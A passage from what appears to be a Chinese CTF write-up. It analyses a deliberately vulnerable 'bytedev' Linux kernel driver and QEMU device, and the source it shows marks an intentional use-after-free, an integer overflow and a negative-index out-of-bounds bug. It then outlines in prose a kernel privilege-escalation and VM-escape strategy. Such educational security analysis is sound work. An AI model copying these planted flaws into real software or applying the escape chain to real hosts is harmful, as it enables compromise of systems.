class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_pci_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pci_dev *pdev,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">bdev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-type">char</span> dname[BYTEDEV_DEVNAME_LENGTH];<br>    <span class="hljs-type">int</span> minor_num;<br>    <span class="hljs-type">int</span> err;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] ByteDance pci device detected!&quot;</span>);<br><br>    <span class="hljs-comment">/* alloc space for bytedev struct*/</span><br>    <span class="hljs-keyword">if</span> (!(bdev = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev), GFP_KERNEL))) &#123;<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_no_mem;<br>    &#125;<br><br>    pci_set_drvdata(pdev, bdev);<br><br>    <span class="hljs-comment">/* enable the device */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_enable_device(pdev))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Cannot enable PCI device, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_free_dev;<br>&#125;<br><br>    <span class="hljs-comment">/* check for MMIO flags on BAR 0 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">0</span>) &amp; IORESOURCE_MEM)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for MMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for PMIO flags on BAR 1 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">1</span>) &amp; IORESOURCE_IO)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for PMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* request for PCI bar spaces */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_request_regions(pdev, DRV_NAME))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot obtain PCI resources, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* iomap for mmio space */</span><br>    bdev-&gt;mmio_addr = pci_ioremap_bar(pdev, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bdev-&gt;mmio_addr) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot ioremap for MMIO space, abort.&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_out_free_region;<br>    &#125;<br><br>    <span class="hljs-comment">/* get I/O ports base */</span><br>    bdev-&gt;io_base = pci_resource_start(pdev, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* register device node */</span><br>    minor_num = bytedev_get_unused_minor_num();<br><br>    <span class="hljs-keyword">if</span> (minor_num &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] bytedev amount limits!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_iounmap_mmio;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (minor_num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s&quot;</span>, DEVICE_NAME);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s%d&quot;</span>, DEVICE_NAME, minor_num);<br>    &#125;<br><br>    dev_node = device_create(bytedev_class, <span class="hljs-literal">NULL</span>, <br>                            MKDEV(bytedev_major_num, minor_num), <br>                            <span class="hljs-literal">NULL</span>, dname);<br>    <span class="hljs-keyword">if</span> (IS_ERR(dev_node)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Failed to create the device!&quot;</span>);<br>        err = PTR_ERR(dev_node);<br>        <span class="hljs-keyword">goto</span> err_out_unuse_minor;<br>    &#125;<br><br>    <span class="hljs-comment">/* other data init */</span><br>    spin_lock_init(&amp;bdev-&gt;dev_lock);<br>    <span class="hljs-built_in">memset</span>(bdev-&gt;data_queue, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) * BYTEDEV_MAX_BUFS);<br>    bdev-&gt;head_idx = <span class="hljs-number">0</span>;<br>    bdev-&gt;tail_idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* info records */</span><br>    bdev-&gt;pdev = pdev;<br>    bdev-&gt;dev_node = dev_node;<br>    bdev-&gt;minor_num = minor_num;<br>    bytedev_arr[minor_num] = bdev;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] bytedev%d register complete.&quot;</span>, minor_num);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_out_unuse_minor:<br>    bytedev_set_unused_minor_num(minor_num);<br>err_out_iounmap_mmio:<br>    pci_iounmap(pdev, bdev-&gt;mmio_addr);<br>err_out_free_region:<br>    pci_release_regions(pdev);<br>err_out_disable_pdev:<br>    pci_disable_device(pdev);<br>err_out_free_dev:<br>    kfree(bdev);<br>err_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>bytedev</code> 结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dev</span>  *<span class="hljs-title">pdev</span>;</span><br>    <span class="hljs-type">int</span> minor_num;<br>    u64 __iomem  *mmio_addr;<br>    u64 io_base;<br><br>    <span class="hljs-type">spinlock_t</span> dev_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">data_queue</span>[<span class="hljs-title">BYTEDEV_MAX_BUFS</span>];</span><br>    <span class="hljs-type">int</span> head_idx, tail_idx;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于流模式而言，其使用一个环形队列 <code>data_queue</code> 来实现进程间的数据传递，我们可以直接通过读写设备文件来实现对环形队列的数据读写，其本质上是一个如下结构的指针数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>第一个漏洞便存在于读的过程当中，在读的过程中存在一个 UAF 漏洞，从而导致读取完数据后对应的 buffer 并没有被释放，但是在正常地对该功能的使用上并不会造成影响，因为 slub allocator 并不似 ptmalloc 那样恒定使用前 8 字节来存放 next free object，这使得其统计数据字段得以保留</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> rlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already empty,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>            ret = rlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        d = dev-&gt;data_queue[dev-&gt;head_idx];<br>        left = d-&gt;len - d-&gt;offset;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_to_user(buf + rlen, &amp;d-&gt;data[d-&gt;offset], clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while reading the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;offset += clen;<br>        rlen += clen;<br><br>        <span class="hljs-keyword">if</span> (d-&gt;offset == d-&gt;len) &#123;<br>            <span class="hljs-keyword">if</span> (d-&gt;len == BYTEDEV_BUF_SIZE) &#123;<br>                kfree(d);<br>                <span class="hljs-comment">/* ther&#x27;s where we made our basic bug: a UAF */</span><br>                <span class="hljs-comment">//dev-&gt;data_queue[dev-&gt;head_idx] = NULL;</span><br>                dev-&gt;head_idx++;<br>                dev-&gt;head_idx %= BYTEDEV_MAX_BUFS;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ret = rlen;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ret = rlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二个漏洞则存在于写的过程当中，在对统计数据字段的判定当中存在一个整型溢出漏洞，若是正常使用则仍不会触发这个漏洞，但若是我们可以通过 UAF 修改其为一个较大的值，那么我们就可以让内核模块认为该 buffer 依然有可以写入的空间，从而完成越界写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_queue_last_empty</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bytedev *dev)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br><br>    <span class="hljs-keyword">if</span> (!dev-&gt;data_queue[idx]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* there&#x27;s where we made our expand bug: integer overflow */</span><br>    <span class="hljs-keyword">return</span> (BYTEDEV_BUF_SIZE - dev-&gt;data_queue[idx]-&gt;len) &gt; <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* the correct version */</span><br>    <span class="hljs-comment">//return dev-&gt;data_queue[idx]-&gt;len &lt; BYTEDEV_BUF_SIZE;</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> wlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br>        <span class="hljs-type">int</span> d_idx;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already full,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>            ret = wlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Fill the unused part of last buffer.</span><br><span class="hljs-comment">         * We mainly fill the data that is less than BYTEDEV_BUF_SIZE there.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_last_empty(dev)) &#123;<br>            <span class="hljs-type">int</span> d_idx = <br>                    (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span> =</span> dev-&gt;data_queue[d_idx];<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left = BYTEDEV_BUF_SIZE - d-&gt;len;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clen = left &gt; size ? size : left;<br><br>            ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>            <span class="hljs-keyword">if</span> (ret) &#123;<br>                printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br><br>            size -= clen;<br>            d-&gt;len += clen;<br>            wlen += clen;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * When we arrive at there, it means that there&#x27;s no space left</span><br><span class="hljs-comment">         * on the tail buffer, so we alloc a new buffer there.</span><br><span class="hljs-comment">         */</span><br>        d_idx = dev-&gt;tail_idx;<br>        dev-&gt;data_queue[d_idx] = <br>                    kmalloc(BYTEDEV_BUF_SIZE + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data), <br>                            GFP_KERNEL_ACCOUNT);<br>        dev-&gt;tail_idx++;<br>        dev-&gt;tail_idx %= BYTEDEV_MAX_BUFS;<br><br>        d = dev-&gt;data_queue[d_idx];<br>        d-&gt;len = <span class="hljs-number">0</span>;<br>        d-&gt;offset = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Copy the data there */</span><br>        left = BYTEDEV_BUF_SIZE;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;len += clen;<br>        wlen += clen;<br>    &#125;<br><br>    ret = wlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、QEMU-设备部分"><a href="#二、QEMU-设备部分" class="headerlink" title="二、QEMU 设备部分"></a>二、QEMU 设备部分</h2><p>第二阶段则是对设备 block 模式下的应用，这里 QEMU 模拟了一个类似于硬盘的设备，我们可以读写指定的扇区（大小为 512 字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevRegs</span> &#123;</span><br>    <span class="hljs-type">int</span> mode;<br>    <span class="hljs-type">int</span> blk_idx;<br>    <span class="hljs-type">int</span> blk_status;<br>&#125; BYTEPCIDevRegs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    BYTEPCIDevRegs regs;<br><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br><br>    <span class="hljs-type">char</span> *blk_mem[BYTEDEV_SECTOR_NUM];<br>&#125; BYTEPCIDevState;<br></code></pre></td></tr></table></figure><p>其中我们使用 PMIO 来实现设备模式的获取与切换、扇区的切换，使用 MMIO 来实现对特定扇区的读写，而漏洞便出在扇区的切换上，虽然设备里有一个后向的扇区索引越界检查，但是存储当前扇区索引所使用的为 int 类型的变量，<strong>而设备代码中并没有对索引为负数的情况进行检查</strong>，因此我们可以进行前向的越界操作，若是在低地址处存在可利用的指针则可以直接完成越界的读写操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">byte_dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    BYTEPCIDevState *ds = BYTEDEV_PCI(opaque);<br>    <span class="hljs-type">int</span> op_idx = val;<br><br>    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    smp_mb();<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_MODE:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_BLK:<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_STREAM:<br>                    ds-&gt;regs.mode = val;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_BLK_IDX:<br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.blk_status == BYTEDEV_BLK_STATUS_BUSY) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.mode != BYTEDEV_MODE_BLK) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-comment">/** </span><br><span class="hljs-comment">             * There&#x27;s where we made our basic bug: OOB rw forward </span><br><span class="hljs-comment">             * Because there&#x27;s no check for minus idx there.</span><br><span class="hljs-comment">             * */</span><br>            <span class="hljs-keyword">if</span> (op_idx &gt;= BYTEDEV_SECTOR_NUM) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            ds-&gt;regs.blk_idx = op_idx;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_BUSY;<br>            <span class="hljs-keyword">if</span> (!ds-&gt;blk_mem[ds-&gt;regs.blk_idx]) &#123;<br>                ds-&gt;blk_mem[ds-&gt;regs.blk_idx] = g_malloc(BYTEDEV_SECTOR_SIZE);<br>            &#125;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_READY;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>漏洞的利用存在两个阶段：第一阶段是利用内核模块中流模式存在的漏洞完成提权，第二阶段则是利用模拟设备中存在的漏洞完成虚拟化逃逸</p><h2 id="Stage-I-kernel-primitive"><a href="#Stage-I-kernel-primitive" class="headerlink" title="Stage.I - kernel primitive"></a>Stage.I - kernel primitive</h2><p>由于我们直接有 UAF 和越界读写，那么第一阶段的解题思路就比较清晰了，我们可以先写入一个 buffer 后读取出该 buffer 制造出 UAF，之后利用其他结构体改写其数据统计字段，之后再通过越界写进行提权，需要注意的是由于开启了 hardened usercopy 检查，我们需要直接在下一个 object 中进行数据写入，而不能进行跨 object 的数据拷贝</p><p>由于分配 buffer 所用的 flag 为 GFP_KERNEL_ACCOUNT，因此最后的提权解法直接套用 CVE-2021-22555 的堆喷 msg_msg + sk_buff 的模板即可</p><h2 id="Stage-II-QEMU-escape"><a href="#Stage-II-QEMU-escape" class="headerlink" title="Stage.II - QEMU escape"></a>Stage.II - QEMU escape</h2><p>由于读写过程为通过对应索引的指针完成读写，因此我们需要向前寻找指向合适区域的指针来实现利用，万幸的是我们前向可读的区域中有 MemoryRegion，还有设备结构体的父类 PCIDevice ：</p><p>利用 MemoryRegion 我们可以泄露出设备自身结构体的地址并读写开头的 512 字节，我们可以在其 io_regions 中的空闲字段构造 ROP 或是一些其他东西</p><p>对于 PCIDevice 我们可以利用最上层的父类 Object 的 properties 成员泄露出 glib 的基地址，从而泄露出 glibc 的基地址（其加载地址间偏移固定）；同时我们还能通过其 io_regions 字段完成对 MemoryRegion 的读写</p><p>那么整个利用思路就非常清晰了：我们先前向读取 properties 泄露出 libc，之后读取 MemoryRegion 泄露出设备结构体地址，在 PCIDevice.io_regions 上构造 fake MemoryRegionOps 后劫持 PMIO 的 MemoryRegion 的 ops 从而完成虚拟机逃逸</p><h2 